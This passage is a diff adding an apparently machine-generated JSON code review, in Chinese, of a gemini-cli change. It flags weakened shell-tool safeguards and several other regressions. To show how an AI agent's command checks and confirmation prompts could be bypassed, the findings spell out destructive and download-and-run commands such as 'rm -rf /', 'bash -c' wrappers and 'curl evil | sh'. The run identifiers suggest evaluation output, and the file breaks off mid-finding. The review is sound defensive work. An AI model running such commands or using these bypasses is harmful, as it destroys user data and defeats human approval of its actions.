@@ -1,0 +1,390 @@
+{
+  "generatedAt": "2026-11-15T03:21:45.739Z",
+  "runId": "20261115_031756_069",
+  "source": "mr",
+  "caseId": "google-gemini__gemini-cli@77ea28a",
+  "rep": 1,
+  "model": "deepseek-v4.1-flash",
+  "findings": [
+    {
+      "id": "F001",
+      "severity": "P0",
+      "category": "安全",
+      "file": "packages/core/src/tools/shell.ts",
+      "line": 123,
+      "title": "命令替换检测被弱化为字面量 includes('$(')，反引号与 <() 可绕过",
+      "description": "原实现 detectCommandSubstitution 会按 bash 引号规则（单引号内不做替换、双引号与无引号内生效）检测 $()、<() 与反引号，遇到即拒绝执行；本次内联后只剩 `command.includes('$(')` 一个字面量判断。结果是反引号命令替换（如 echo `rm -rf x`）与进程替换（如 diff <(cat a) <(cat b)）不再被拦截，而单引号内的字面量 '$(x)' 反而被误拒。该检查是 Shell 工具在交互确认之外的第一道安全护栏，弱化后模型可通过反引号构造任意子命令。",
+      "evidence": [
+        "packages/core/src/tools/shell.ts:123 — if (command.includes('$(')) { return { allowed: false, reason: 'Command substitution using $() is not allowed for security reasons' }",
+        "被删除的 packages/core/src/utils/shell-utils.ts detectCommandSubstitution 逐字符跟踪 inSingleQuotes/inDoubleQuotes/inBackticks，并分别命中 char === '$' && nextChar === '('、char === '<' && nextChar === '('、char === '`'",
+        "packages/core/src/tools/shell.ts:127 — reason 文案从 'Command substitution using $(), <(), or >() is not allowed' 缩窄为仅 $()"
+      ],
+      "rule": "SECURITY-SHELL-SUBSTITUTION-001",
+      "confidence": 0.9,
+      "tips": {
+        "review": "[缺陷类型] 安全校验降级（命令替换检测从引号感知的状态机退化为子串匹配）。影响评估：`echo \\`rm -rf ~\\`` 与 `diff <(curl evil)` 这类命令可通过 validateToolParams，绕过「禁止命令替换」的显式安全策略，仅剩人工确认这一层防护。",
+        "suggestion": "[重构思路] 保留并复用原引号感知的 detectCommandSubstitution（移入 shell.ts 或单独工具模块），不要在重构中把安全判定简化成 includes。代码示例：`const hasSubstitution = detectCommandSubstitution(command); if (hasSubstitution) { return { allowed: false, reason: 'Command substitution using $(), <(), or backticks is not allowed' }; }`",
+        "subcategory": "命令注入与校验降级"
+      }
+    },
+    {
+      "id": "F002",
+      "severity": "P1",
+      "category": "安全",
+      "file": "packages/core/src/tools/shell.ts",
+      "line": 182,
+      "title": "命令拆分改用正则且遗漏 & 与换行，黑/白名单可被前缀绕过",
+      "description": "新的拆分逻辑为 `command.split(/&&|\\|\\||\\||;/)`，相比被删除的 splitCommands：(1) 不把单个 `&` 与换行符当作命令分隔符；(2) 完全忽略引号与转义状态。由于后续用 isPrefixedBy 只比对每段开头，`sleep 1 & rm -rf /`、`echo hi\\nrm -rf /` 这类命令会作为一整段以 sleep/echo 开头通过 excludeTools 黑名单与 coreTools 严格白名单，实际却由 bash 执行了被禁止的命令。",
+      "evidence": [
+        "packages/core/src/tools/shell.ts:182 — const commandsToValidate = command.split(/&&|\\|\\||\\||;/).map(normalize);",
+        "被删除的 splitCommands 显式处理了 char === '&'、char === ';'、char === '|'、'&&'、'||'，并用 inSingleQuotes/inDoubleQuotes 与 '\\\\' 转义保持引号内内容不被拆分",
+        "packages/core/src/tools/shell.ts:186-196 — 逐段只用 isPrefixedBy(cmd, blocked) 判断，段首匹配即视为整段受控"
+      ],
+      "rule": "SECURITY-SHELL-SPLIT-002",
+      "confidence": 0.82,
+      "tips": {
+        "review": "[缺陷类型] 命令分段不完整导致配置化黑/白名单被绕过（单个 & 后台执行、换行、引号内分隔符）。影响评估：excludeTools/coreTools 配置形同虚设，严格白名单模式下 `npm test & curl evil | sh` 也会被判为允许。",
+        "suggestion": "[重构思路] 恢复引号感知的 splitCommands（同时把 `&`、换行 \\n/\\r 纳入分隔符），并对每段独立做校验；若不想维护状态机，可用 shell-quote（仓库已在用 parse）解析后再按操作符切分。代码示例：`const segments = splitCommands(command); // 处理 ; & | && || \\n 与引号转义\nfor (const raw of segments) { const cmd = normalize(raw); if (!cmd) return { allowed: false, reason: 'Empty command segment' }; /* 逐段黑白名单校验 */ }`",
+        "subcategory": "命令解析与白名单绕过"
+      }
+    },
+    {
+      "id": "F003",
+      "severity": "P1",
+      "category": "安全",
+      "file": "packages/core/src/tools/shell.ts",
+      "line": 262,
+      "title": "确认流程降为单一 rootCommand，allow-always 会把整条复合命令的其余部分一并放行",
+      "description": "shouldConfirmExecute 现在只取第一个 rootCommand 作为确认与白名单键：`const rootCommand = this.getCommandRoot(params.command)!`，并在 ProceedAlways 时仅 whitelist.add(rootCommand)。原实现会收集所有 root commands（commandsToConfirm.join(', ')）并逐个加入 allowlist。改后用户对 `git status && rm -rf build` 选择 “always allow” 时只记住 `git`，之后任意 `git ... && <任意命令>` 都不再弹确认，等于把 allow-always 的授权范围从“这条命令的每个子命令”扩大到“首个子命令前缀下的任意命令链”。",
+      "evidence": [
+        "packages/core/src/tools/shell.ts:262-264 — const rootCommand = this.getCommandRoot(params.command)!; if (this.whitelist.has(rootCommand)) return false;",
+        "packages/core/src/tools/shell.ts:271-275 — 仅在 ProceedAlways 时 this.whitelist.add(rootCommand)，只记录单个 rootCommand",
+        "被删除的实现：const rootCommands = [...new Set(getCommandRoots(command))]; const commandsToConfirm = rootCommands.filter((command) => !this.allowlist.has(command)); 以及 commandsToConfirm.forEach((command) => this.allowlist.add(command))"
+      ],
+      "rule": "SECURITY-SHELL-CONFIRM-003",
+      "confidence": 0.85,
+      "tips": {
+        "review": "[缺陷类型] 授权粒度退化（复合命令只按首个 root command 记忆放行）。影响评估：一次 allow-always 之后，`git ... && curl evil | sh` 之类命令不再需要确认，用户授权的边界被静默放大。",
+        "suggestion": "[重构思路] 恢复按全部子命令确认与白名单；确认文案同时展示所有待授权的 root commands。代码示例：`const rootCommands = [...new Set(splitCommands(params.command).map((c) => this.getCommandRoot(c)!))]; const pending = rootCommands.filter((c) => !this.whitelist.has(c)); if (pending.length === 0) return false; return { ...confirmationDetails, rootCommand: pending.join(', '), onConfirm: async (o) => { if (o === ProceedAlways) pending.forEach((c) => this.whitelist.add(c)); } };`",
+        "subcategory": "授权范围放大"
+      }
+    },
+    {
+      "id": "F004",
+      "severity": "P1",
+      "category": "安全",
+      "file": "packages/core/src/tools/shell.ts",
+      "line": 105,
+      "title": "getCommandRoot 不处理引号且不再剥离 sh/bash 包装，白名单 bash 等于放行任意命令",
+      "description": "新的 getCommandRoot 先删除 {}()，再按空白与 ;&| 切分取首段、再按路径分隔符取末段，全程不识别引号；同时 stripShellWrapper 被删除，执行时也不再剥壳。于是 `bash -c 'rm -rf /'` 的 root command 变成 `bash`、`sh -c \"...\"` 变成 `sh`。一旦用户在确认中选择 allow-always（或配置里允许 bash），后续任何 `bash -c <任意脚本>` 都直接执行且不再确认；原来靠 stripShellWrapper 将命令还原为 rm 后逐个子命令授权的保护消失。此外带引号的命令（如 `\"ls -la\"`）会被解析出带引号的 root command，导致白名单键与用户认知不一致。",
+      "evidence": [
+        "packages/core/src/tools/shell.ts:105-111 — getCommandRoot 只有 trim / replace(/[{}()]/g,'') / split(/[\\s;&|]+/)[0] / split(/[/\\\\]/).pop()，没有引号状态机",
+        "被删除的 shell-utils.ts getCommandRoot 用 /^\"([^\"]+)\"|^'([^']+)'|^(\\S+)/ 优先取引号内内容，并且 execute 前调用 stripShellWrapper 剥离 sh|bash|zsh|cmd.exe 的 -c/​/c 包装",
+        "packages/core/src/tools/shell.ts:280-300 execute 直接以 params.command 组包执行，不再有 const strippedCommand = stripShellWrapper(params.command)"
+      ],
+      "rule": "SECURITY-SHELL-WRAPPER-004",
+      "confidence": 0.83,
+      "tips": {
+        "review": "[缺陷类型] 命令根解析退化 + 移除 shell 包装剥离，导致对 bash/sh 的授权等价于无限制执行。影响评估：用户在 `bash -c 'curl ... | sh'` 上点 allow-always 后，解释器入口被永久放行。",
+        "suggestion": "[重构思路] 恢复引号感知的 getCommandRoot 与 stripShellWrapper：先剥壳再解析，并把 `bash/sh/zsh -c` 这类解释器入口纳入危险命令集合强制每次确认。代码示例：`const inner = stripShellWrapper(params.command); const root = getCommandRoot(inner); if (INTERPRETERS.has(root)) { /* 不进入 whitelist，强制确认 */ }`",
+        "subcategory": "命令根解析与解释器放行"
+      }
+    },
+    {
+      "id": "F005",
+      "severity": "P1",
+      "category": "可靠性",
+      "file": "packages/cli/src/ui/components/InputPrompt.tsx",
+      "line": 98,
+      "title": "shouldShowCompletion 要求“@或/后无未转义空格”，导致 slash 子命令与参数补全不再触发",
+      "description": "新增的门控把补全激活条件改为 (isAtCommand || isSlashCommand(buffer.text)) && isCursorAfterCommandWithoutSpace()，而 isCursorAfterCommandWithoutSpace 从光标向前遇到第一个未转义空格即 return false。原 useCompletion 里的 `if (isSlashCommand(buffer.text.trim())) return true;` 已被删除。因此输入 `/mcp `（含尾随空格，准备选子命令）或 `/myPrompt --`（准备补参数名）时光标前紧邻空格，判定恒为 false，补全列表不会再出现；这也使本次新增的 promptCommands completion（返回 `${partialArg}--${arg.name}=\"\"`）永远无法展示。",
+      "evidence": [
+        "packages/cli/src/ui/components/InputPrompt.tsx:71-87 — for (let i = col - 1; i >= 0; i--) ... if (char === ' ') { ... if (!isEscaped) { return false; } }",
+        "packages/cli/src/ui/components/InputPrompt.tsx:98-103 — shouldShowCompletion 为 (isAtCommand(buffer.text) || isSlashCommand(buffer.text)) && isCursorAfterCommandWithoutSpace()",
+        "useCompletion.ts 被删除的分支：if (isSlashCommand(buffer.text.trim())) { return true; }（slash 命令此前不要求光标紧贴命令词）",
+        "packages/cli/src/ui/commands/promptCommands.ts:158-175 — completion 返回 `${partialArg}--${arg.name}=\"\"`，依赖命令名后出现空格时仍激活补全"
+      ],
+      "rule": "UX-COMPLETION-005",
+      "confidence": 0.8,
+      "tips": {
+        "review": "[缺陷类型] 补全激活条件收紧导致功能回归。影响评估：`/mcp `、`/memory ` 等带子命令的 slash 命令无法再列出子命令；新增的 MCP prompt 参数补全完全不可用，属于明显的交互回归。",
+        "suggestion": "[重构思路] 对 slash 命令保留“只要首行以 / 开头且未输入到参数值阶段就激活”的语义，只对 @ 路径补全使用空格门控。代码示例：`const shouldShowCompletion = () => isSlashCommand(buffer.text.trimStart()) ? true : isAtCommand(buffer.text) && isCursorAfterCommandWithoutSpace();`",
+        "subcategory": "输入补全激活条件"
+      }
+    },
+    {
+      "id": "F006",
+      "severity": "P2",
+      "category": "可靠性",
+      "file": "packages/cli/src/ui/commands/promptCommands.ts",
+      "line": 146,
+      "title": "prompt 结果用 JSON.stringify 直接提交，会把引号与转义换行注入到提示词",
+      "description": "调用 MCP prompt 成功后返回 { type: 'submit_prompt', content: JSON.stringify(result.messages[0].content.text) }。JSON.stringify 会给文本加上外层双引号并把换行转义为字面的 \\n，因此模型收到的是被 JSON 编码后的字符串而不是 prompt 原文，多行模板会被压成一行带 \\n 的文本，模板中的引号也会被转义。同时只取 messages[0]，多消息 prompt 的其余内容被丢弃。",
+      "evidence": [
+        "packages/cli/src/ui/commands/promptCommands.ts:144-147 — return { type: 'submit_prompt', content: JSON.stringify(result.messages[0].content.text) };",
+        "packages/cli/src/ui/commands/promptCommands.ts:135-142 — 仅校验 result.messages?.[0]?.content?.text 后就短路返回，未处理后续 messages",
+        "packages/core/src/tools/mcp-client.ts:541-543 — invokeMcpPrompt 返回 GetPromptResult（messages 为数组）"
+      ],
+      "rule": "CORRECTNESS-PROMPT-006",
+      "confidence": 0.85,
+      "tips": {
+        "review": "[缺陷类型] 数据编码错误（提交前多余 JSON 序列化）+ 多消息丢失。影响评估：所有 MCP prompt 渲染出的提示词都带引号与被转义的 \\n，模板语义失真；含多条 message 的 prompt 只生效第一条。",
+        "suggestion": "[重构思路] 直接提交拼接后的纯文本，并对 content.type 做分支处理。代码示例：`const text = result.messages.filter((m) => m.content.type === 'text').map((m) => m.content.text).join('\\n'); if (!text) { return { type: 'message', messageType: 'error', content: 'Received an empty prompt response.' }; } return { type: 'submit_prompt', content: text };`",
+        "subcategory": "数据编码与内容截断"
+      }
+    },
+    {
+      "id": "F007",
+      "severity": "P2",
+      "category": "可靠性",
+      "file": "packages/cli/src/ui/commands/promptCommands.ts",
+      "line": 26,
+      "title": "prompt 命令在加载时一次性快照，MCP 异步发现完成后不会刷新",
+      "description": "createPromptCommands 在 BuiltinCommandLoader.loadCommands 里被调用一次，内部通过 getMCPServerPrompts(serverName) 读取当时的全局缓存。而命令加载发生在 slashCommandProcessor 挂载时的 CommandService.create（useEffect 依赖 [config]，仅执行一次），MCP 连接与 prompts 发现（ToolRegistry.discoverMcpTools → connectAndDiscover → discoverPrompts）是异步进行的，通常晚于该时刻。结果是 prompt 对应的 slash 命令列表大概率为空且整个会话都不会补齐；同时若某个 prompt 在被调用时已被 mcpServerPromptsInternal 删除，命令仍会保留指向过期 prompt 的闭包。",
+      "evidence": [
+        "packages/cli/src/ui/commands/promptCommands.ts:21-27 — createPromptCommands 内 for (const serverName in mcpServers) { const prompts = getMCPServerPrompts(serverName) || []; for (const prompt of prompts) {...} }",
+        "packages/cli/src/ui/hooks/slashCommandProcessor.ts:163-182 — useEffect(() => { const loaders = [new BuiltinCommandLoader(config), ...]; CommandService.create(loaders, signal)... }, [config])，仅在 config 变化时重算一次",
+        "packages/core/src/tools/mcp-client.ts:424 — discoverPrompts(mcpServerName, mcpClient) 在 connectAndDiscover（异步连接流程）内部执行，晚于命令加载"
+      ],
+      "rule": "LIFECYCLE-COMMAND-007",
+      "confidence": 0.62,
+      "tips": {
+        "review": "[缺陷类型] 异步数据与静态命令注册的时序错配（无刷新机制）。影响评估：多数会话里 MCP prompt 命令根本不出现；一旦出现也只在启动竞态恰好有利时可用，行为不稳定。",
+        "suggestion": "[重构思路] 把 prompt 命令改成动态生成：在命令执行/补全时实时读取 getMCPServerPrompts，或在 MCP 状态变化监听器（addMCPStatusChangeListener）触发后重建 CommandService。代码示例：`addMCPStatusChangeListener(() => rebuildCommands()); // 或注册一个 catch-all SlashCommand，在 action 内按 args 实时查 getMCPServerPrompts(server)`",
+        "subcategory": "注册时序与动态刷新"
+      }
+    },
+    {
+      "id": "F008",
+      "severity": "P2",
+      "category": "可靠性",
+      "file": "packages/core/src/tools/mcp-client.ts",
+      "line": 406,
+      "title": "IDE MCP server 只设置了 onerror，未处理 onclose，断连后状态与 ideContext 保持陈旧",
+      "description": "迁移到通用 MCP 机制后，IDE 连接只注册了 mcpClient.onerror（清理 prompts 缓存与 ideContext），原先 IdeClient 同时注册的 onclose 没有对应实现。当 VS Code companion 正常关闭连接（窗口关闭、扩展停用）时，连接是优雅结束而非 error，MCPServerStatus 会停留在 CONNECTED，ideContext 也不会 clearOpenFilesContext()。表现为 /ide status 一直显示 🟢 Connected，ContextSummaryDisplay 继续展示已失效的 activeFile，模型也可能继续把陈旧的文件上下文带入请求。",
+      "evidence": [
+        "packages/core/src/tools/mcp-client.ts:406-413 — 只赋值 mcpClient.onerror = (error) => { updateMCPServerStatus(..., DISCONNECTED); mcpServerPromptsInternal.delete(...); if (mcpServerName === IDE_SERVER_NAME) ideContext.clearOpenFilesContext(); }",
+        "被删除的 packages/core/src/ide/ide-client.ts 中同时存在 this.client.onclose = () => { this.connectionStatus = IDEConnectionStatus.Disconnected; ideContext.clearOpenFilesContext(); }",
+        "packages/core/src/services/ideContext.ts:82-85 — clearOpenFilesContext 是唯一清除 activeFile 的入口，未被调用则 openFilesContext 一直保留"
+      ],
+      "rule": "LIFECYCLE-MCP-008",
+      "confidence": 0.75,
+      "tips": {
+        "review": "[缺陷类型] 连接生命周期回调缺失（只处理 error 不处理 close）。影响评估：IDE 侧正常退出后 CLI 显示错误的连接状态并继续使用过期文件上下文，用户难以判断集成是否可用。",
+        "suggestion": "[重构思路] 为 IDE server 补齐 onclose 处理，且错误/关闭路径统一走一个清理函数。代码示例：`const onDisconnect = () => { updateMCPServerStatus(mcpServerName, MCPServerStatus.DISCONNECTED); mcpServerPromptsInternal.delete(mcpServerName); if (mcpServerName === IDE_SERVER_NAME) ideContext.clearOpenFilesContext(); }; mcpClient.onerror = onDisconnect; mcpClient.onclose = onDisconnect;`",
+        "subcategory": "连接状态与上下文清理"
+      }
+    },
+    {
+      "id": "F009",
+      "severity": "P2",
+      "category": "可靠性",
+      "file": "packages/core/src/services/loopDetectionService.ts",
+      "line": 144,
+      "title": "partialContent 无长度上限，且仅以 .!? 断句，无标点输出时永不检测且内存无界增长",
+      "description": "新的内容循环检测把流式片段累加进 partialContent，只有在匹配到 [.!?]+(?=\\s|$) 时才切句，切句后仅保留最后一句之后的残余。若模型持续输出不含 .!? 的内容（压缩 JSON、代码、中文正文常用 。！？），partialContent 会在整个流式响应期间持续增长且从不清空，既丧失原有的 MAX_HISTORY_LENGTH=1000 截断保护，也使「句子重复」判定彻底失效（永远 return false）。这是一个既能导致内存膨胀又能导致防护失效的双向回归。",
+      "evidence": [
+        "packages/core/src/services/loopDetectionService.ts:144-148 — this.partialContent += content; if (!SENTENCE_ENDING_PUNCTUATION_REGEX.test(this.partialContent)) { return false; }",
+        "packages/core/src/services/loopDetectionService.ts:156-159 — 只有拿到 completeSentences 后才执行 this.partialContent = this.partialContent.slice(endOfLastSentence)",
+        "被删除的实现包含 const MAX_HISTORY_LENGTH = 1000 与 truncateAndUpdate()，对 streamContentHistory 做截断",
+        "packages/core/src/services/loopDetectionService.ts:42 — 常量仅新增 SENTENCE_ENDING_PUNCTUATION_REGEX = /[.!?]+(?=\\s|$)/，未覆盖中文标点"
+      ],
+      "rule": "PERF-LOOP-009",
+      "confidence": 0.78,
+      "tips": {
+        "review": "[缺陷类型] 累积缓冲区无界增长 + 检测覆盖面收缩（仅 ASCII 句末标点）。影响评估：长输出场景下内存随响应长度线性增长；对不带 .!? 的输出（代码/JSON/中文）内容循环检测完全失效，用户可能收到无尽重复内容。",
+        "suggestion": "[重构思路] 给 partialContent 设上限（超出即截断或强制按窗口切分），并把断句集合扩展到中文标点/换行；保留对不同文本形态的兜底检测。代码示例：`const SENTENCE_END = /[.!?。！？\\n]+(?=\\s|$)/; if (this.partialContent.length > MAX_PARTIAL_LENGTH) { this.partialContent = this.partialContent.slice(-MAX_PARTIAL_LENGTH); }`",
+        "subcategory": "循环检测与内存边界"
+      }
+    },
+    {
+      "id": "F010",
+      "severity": "P2",
+      "category": "可移植",
+      "file": "packages/cli/src/ui/hooks/useCompletion.ts",
+      "line": 396,
+      "title": "删除反斜杠归一化后，Windows 上 glob 建议值会带反斜杠，@ 路径补全与过滤逻辑失配",
+      "description": "原实现在返回建议前统一把 label/value 的 \\\\ 替换为 /（注释明确写明“Like glob, we always return forwardslashes, even in windows”），本次删除了该归一化，并改为 label: path.relative(cwd, file)。glob 在 Windows 上返回正斜杠相对路径，经过 path.relative 后变成反斜杠形式；而 InputPrompt.handleAutocomplete 用 pathPart.lastIndexOf('/') 计算替换起点、fileDiscoveryService.shouldIgnoreFile 也以 / 为分隔符，含反斜杠的建议值会导致补全替换范围错误、ignore 判定不一致。另外 path.relative(cwd, file) 依赖 file 为绝对路径，当前仅因 targetDir 等于 process.cwd() 才碰巧成立。",
+      "evidence": [
+        "packages/cli/src/ui/hooks/useCompletion.ts:394-401 — const relativePath = path.relative(cwd, file); return { label: relativePath, value: escapePath(relativePath) };",
+        "被删除的收尾归一化：fetchedSuggestions = fetchedSuggestions.map((s) => ({ ...s, label: s.label.replace(/\\\\/g, '/'), value: s.value.replace(/\\\\/g, '/') }));",
+        "packages/cli/src/ui/components/InputPrompt.tsx 的 handleAutocomplete 中 const lastSlashIndexInPath = pathPart.lastIndexOf('/')，依赖正斜杠分隔符",
+        "packages/cli/src/ui/hooks/useCompletion.ts:388-392 — glob(globPattern, { cwd, ... }) 返回的路径本身已是相对 cwd 的形式"
+      ],
+      "rule": "PORTABILITY-PATH-010",
+      "confidence": 0.7,
+      "tips": {
+        "review": "[缺陷类型] 跨平台路径分隔符处理回退。影响评估：Windows 用户的 @ 文件补全会插入反斜杠路径，后续目录段补全与 ignore 过滤判定错乱；改为 path.relative 还引入了对 cwd 与 process.cwd() 一致性的隐式依赖。",
+        "suggestion": "[重构思路] 统一在产出建议时归一化为正斜杠，并且对 glob 已相对的结果不要再做 path.relative。代码示例：`const normalize = (p: string) => p.replace(/\\\\/g, '/'); const suggestions = files.map((file) => { const rel = normalize(file); return { label: rel, value: escapePath(rel) }; });`",
+        "subcategory": "路径分隔符与平台差异"
+      }
+    },
+    {
+      "id": "F011",
+      "severity": "P2",
+      "category": "可靠性",
+      "file": "packages/cli/src/ui/components/InputPrompt.tsx",
+      "line": 284,
+      "title": "输入未聚焦时直接 return，破坏原先显式支持的拖拽粘贴",
+      "description": "handleInput 开头由 `if (!focus && !key.paste) return;` 改为 `if (!focus) return;`，同时 useKeypress 的 isActive 也从 true 改为 focus。原代码留有注释「We want to handle paste even when not focused to support drag and drop.」，说明未聚焦时的粘贴是刻意支持的拖拽落文件路径场景；改动后未聚焦状态下的粘贴事件既不会进入 handleInput，也不会被 useKeypress 分发，拖拽文件到终端不再生成 @ 路径。",
+      "evidence": [
+        "packages/cli/src/ui/components/InputPrompt.tsx:282-286 — const handleInput = useCallback((key: Key) => { if (!focus) { return; } ...",
+        "被删除的代码及其注释：/// We want to handle paste even when not focused to support drag and drop. if (!focus && !key.paste) { return; }",
+        "packages/cli/src/ui/components/InputPrompt.tsx 中 useKeypress(handleInput, { isActive: focus })（原为 { isActive: true }）"
+      ],
+      "rule": "UX-PASTE-011",
+      "confidence": 0.7,
+      "tips": {
+        "review": "[缺陷类型] 交互能力回归（未聚焦时丢弃 paste 事件）。影响评估：拖拽文件到终端这一被显式支持的用法失效，用户只能先聚焦输入框；与本次同时移除 text-buffer 的 paste 标记相叠加，整个拖拽路径推断能力被削弱。",
+        "suggestion": "[重构思路] 保留未聚焦时的 paste 特例，并让 useKeypress 在未聚焦时也分发 paste。代码示例：`if (!focus && !key.paste) { return; } // 保持 drag-and-drop 支持` 配合 `useKeypress(handleInput, { isActive: true })`",
+        "subcategory": "剪贴板与拖拽粘贴"
+      }
+    },
+    {
+      "id": "F012",
+      "severity": "P2",
+      "category": "可靠性",
+      "file": "packages/cli/src/ui/components/shared/text-buffer.ts",
+      "line": 1045,
+      "title": "拖拽路径改写为 @path 时不再补尾随空格，后续输入会粘在路径上",
+      "description": "insert 中识别到有效路径时由 `ch = `@${potentialPath} `;` 改为 `ch = `@${potentialPath}`;`，去掉了用于分隔的尾随空格。用户拖入/粘贴文件路径后再继续输入内容，会直接拼接到路径后面（如 @src/a.tsfoo），既不再是可解析的 @ 引用，也会立刻触发/干扰 @ 补全。",
+      "evidence": [
+        "packages/cli/src/ui/components/shared/text-buffer.ts:1044-1046 — if (isValidPath(unescapePath(potentialPath))) { ch = `@${potentialPath}`; }",
+        "被删除的实现：ch = `@${potentialPath} `;（带尾随空格）"
+      ],
+      "rule": "UX-ATREF-012",
+      "confidence": 0.7,
+      "tips": {
+        "review": "[缺陷类型] 交互细节回归（缺少分隔空格）。影响评估：拖拽插入的 @ 文件引用与其后输入粘连，产生无效引用与补全抖动，用户需手动补空格。",
+        "suggestion": "[重构思路] 恢复尾随空格。代码示例：`if (isValidPath(unescapePath(potentialPath))) { ch = `@${potentialPath} `; }`",
+        "subcategory": "@ 引用插入格式"
+      }
+    },
+    {
+      "id": "F013",
+      "severity": "P2",
+      "category": "可靠性",
+      "file": "packages/cli/src/config/config.ts",
+      "line": 359,
+      "title": "保留名 _ide_server 只警告不剔除，端口缺失时用户配置仍会生效",
+      "description": "ideMode 下先判断 if (mcpServers[IDE_SERVER_NAME]) 并 warn「Ignoring user-defined MCP server config ... reserved name」，但并未 delete 该键；只有 GEMINI_CLI_IDE_SERVER_PORT 存在时才用 MCPServerConfig 覆盖。端口不存在时（例如未安装 companion 扩展，恰好是这条 warn 最可能出现的场景），用户或扩展注入的 _ide_server 配置会被当作普通 MCP server 连接，而 mcp-client 又会因名字等于 IDE_SERVER_NAME 注册 OpenFilesNotificationSchema 处理器并向 ideContext 写入——日志与实际行为不一致，且保留了用保留名伪造 IDE 上下文的可能。",
+      "evidence": [
+        "packages/cli/src/config/config.ts:358-363 — if (mcpServers[IDE_SERVER_NAME]) { logger.warn(`Ignoring user-defined MCP server config for \"${IDE_SERVER_NAME}\" as it is a reserved name.`); }（无 delete）",
+        "packages/cli/src/config/config.ts:364-381 — 仅 when (companionPort) 为真时才 mcpServers[IDE_SERVER_NAME] = new MCPServerConfig(...)",
+        "packages/core/src/tools/mcp-client.ts:410-421 — 名字等于 IDE_SERVER_NAME 时无条件注册 OpenFilesNotificationSchema 并写 ideContext"
+      ],
+      "rule": "CONFIG-RESERVED-013",
+      "confidence": 0.75,
+      "tips": {
+        "review": "[缺陷类型] 保留名校验只告警不生效，日志与行为不一致。影响评估：用户配置的同名 server 可能被真实连接并向 IDE 上下文注入数据（伪造 activeFile），同时用户被日志误导以为已被忽略。",
+        "suggestion": "[重构思路] 先无条件剔除保留名再按需注入。代码示例：`if (mcpServers[IDE_SERVER_NAME]) { logger.warn(...); delete mcpServers[IDE_SERVER_NAME]; } if (!ideMode) { /* 同样剔除，避免非 IDE 模式下被伪造 */ }`",
+        "subcategory": "配置保留名处理"
+      }
+    },
+    {
+      "id": "F014",
+      "severity": "P2",
+      "category": "可维护",
+      "file": "packages/cli/src/ui/commands/promptCommands.ts",
+      "line": 28,
+      "title": "prompt 命令直接以 prompt.name 作为全局 slash 命令名，无命名空间与冲突处理",
+      "description": "createPromptCommands 用 `const commandName = `${prompt.name}`;` 生成顶层 slash 命令，既不加 server 前缀，也不检查与内置命令（mcp、memory、help、quit 等）或其他 server 同名 prompt 的冲突。多个 MCP server 暴露同名 prompt 时会生成重复命令，解析结果取决于加载顺序；若某个 prompt 恰好命名为内置命令（如 help、theme），则会与内置定义并存甚至覆盖用户预期，行为难以预测。",
+      "evidence": [
+        "packages/cli/src/ui/commands/promptCommands.ts:28 — const commandName = `${prompt.name}`;",
+        "packages/cli/src/services/BuiltinCommandLoader.ts:47-73 — 内置命令与 ...createPromptCommands(this.config) 平铺在同一个返回数组中，无去重/冲突校验",
+        "packages/cli/src/ui/commands/promptCommands.ts:25-27 — 遍历所有 serverName，不同 server 的同名 prompt 会生成相同 name 的多条命令"
+      ],
+      "rule": "MAINTAINABILITY-NAMING-014",
+      "confidence": 0.6,
+      "tips": {
+        "review": "[缺陷类型] 命名空间缺失与命令名冲突。影响评估：多 server 场景下命令重复、解析不确定；prompt 名与内置命令撞名时可能遮蔽内置行为，排查成本高。",
+        "suggestion": "[重构思路] 使用 server 前缀（如 `/server:prompt`）或子命令形式（`/prompts <server> <prompt>`），并在注册时检测重名。代码示例：`const commandName = `${serverName}:${prompt.name}`; if (existingNames.has(commandName)) { logger.warn(`Duplicate prompt command ${commandName} ignored`); continue; }`",
+        "subcategory": "命令命名与冲突"
+      }
+    },
+    {
+      "id": "F015",
+      "severity": "P2",
+      "category": "可靠性",
+      "file": "packages/cli/src/validateNonInterActiveAuth.ts",
+      "line": 15,
+      "title": "移除 GOOGLE_GENAI_USE_GCA 认证路径，存量脚本会静默改变认证方式或直接退出",
+      "description": "本次同时删除了三处 GCA 相关逻辑：validateNonInterActiveAuth 的 getAuthTypeFromEnv 不再识别 GOOGLE_GENAI_USE_GCA=true、sandbox.ts 不再向容器传递该变量、oauth2.ts 不再支持 GOOGLE_CLOUD_ACCESS_TOKEN 直接设置凭据。对仍以 GOOGLE_GENAI_USE_GCA=true（或依赖 GOOGLE_CLOUD_ACCESS_TOKEN）运行的 CI/脚本，非交互启动会因无 effectiveAuthType 而直接 process.exit(1)，交互路径则会走完整 OAuth 流程而非无头凭据，属于无声的行为破坏且没有弃用提示。",
+      "evidence": [
+        "packages/cli/src/validateNonInterActiveAuth.ts:15-21 — effectiveAuthType 仅包含 GOOGLE_GENAI_USE_VERTEXAI 与 GEMINI_API_KEY 两个来源，GOOGLE_GENAI_USE_GCA 分支被删除",
+        "packages/cli/src/validateNonInterActiveAuth.ts:23-27 — 无有效类型时 console.error 并 process.exit(1)",
+        "被删除的代码：packages/core/src/code_assist/oauth2.ts 中 if (process.env.GOOGLE_GENAI_USE_GCA && process.env.GOOGLE_CLOUD_ACCESS_TOKEN) { client.setCredentials({ access_token: ... }) }",
+        "被删除的 packages/cli/src/utils/sandbox.ts 中传递 GOOGLE_GENAI_USE_GCA 到容器的 --env 逻辑"
+      ],
+      "rule": "COMPAT-AUTH-015",
+      "confidence": 0.6,
+      "tips": {
+        "review": "[缺陷类型] 破坏性变更缺少迁移提示。影响评估：使用 GOOGLE_GENAI_USE_GCA / GOOGLE_CLOUD_ACCESS_TOKEN 的既有自动化在升级后直接失败或改用不同认证方式，错误信息未提示该变量已被移除。",
+        "suggestion": "[重构思路] 若确需下线，至少在检测到旧变量时给出明确的弃用/迁移报错，并在 release note 说明替代方案（settings 中的 auth 配置或 GEMINI_API_KEY / GOOGLE_GENAI_USE_VERTEXAI）。代码示例：`if (process.env.GOOGLE_GENAI_USE_GCA) { console.error('GOOGLE_GENAI_USE_GCA is no longer supported; please set an auth method in settings or use GEMINI_API_KEY / GOOGLE_GENAI_USE_VERTEXAI.'); process.exit(1); }`",
+        "subcategory": "认证兼容性"
+      }
+    },
+    {
+      "id": "F016",
+      "severity": "P2",
+      "category": "可靠性",
+      "file": "esbuild.config.js",
+      "line": 24,
+      "title": "删除 is-in-ci 补丁后 ink 可能在 CI 环境不渲染 UI（回归 issue #1563）",
